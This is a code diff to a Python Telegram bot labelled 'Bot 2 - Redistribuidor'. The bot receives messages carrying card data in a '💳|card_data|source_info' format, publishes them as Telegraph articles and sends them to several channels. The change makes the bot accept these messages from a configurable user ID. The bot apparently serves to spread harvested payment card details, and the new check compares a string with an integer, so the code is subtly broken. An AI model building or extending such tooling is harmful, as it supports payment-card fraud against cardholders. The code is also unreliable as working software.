@@ -22,6 +22,7 @@ BOT_TOKEN_2 = os.environ.get("BOT_TOKEN_2")
 BOT1_ID = int(os.environ.get("BOT1_ID", 8614851086))
 API_ID = os.environ.get("API_ID", "")
 API_HASH = os.environ.get("API_HASH", "")
+USER_ID = os.environ.get("USER_ID", "")
 
 # Validar variables
 if not BOT_TOKEN_2:
@@ -105,12 +106,12 @@ async def create_telegraph_article(card_data: str, source_info: str) -> Optional
 
 # ==================== HANDLERS ====================
 @app.on_message(filters.private)
-async def handle_bot1_message(client, message):
+async def handle_user_id_message(client, message):
     """Procesa mensajes del Bot 1"""
     logger.info(f"📨 Mensaje recibido de usuario ID: {message.from_user.id}")
     
     # Verificar que es el Bot 1
-    if message.from_user and message.from_user.id == BOT1_ID:
+    if message.from_user and message.from_user.id == USER_ID:
         if message.text and message.text.startswith("💳|"):
             try:
                 # Parsear el mensaje: 💳|card_data|source_info
@@ -174,7 +175,7 @@ async def start_command(client, message):
     await message.reply(
         "🤖 **Bot 2 - Redistribuidor**\n\n"
         "✅ Estoy listo para procesar tarjetas del Bot 1\n"
-        f"📡 ID Bot 1 configurado: `{BOT1_ID}`\n"
+        f"📡 ID USER configurado: `{USER_ID}`\n"
         f"📊 Canales destino configurados: {len(CHANNEL_MAPPING)}"
     )
 
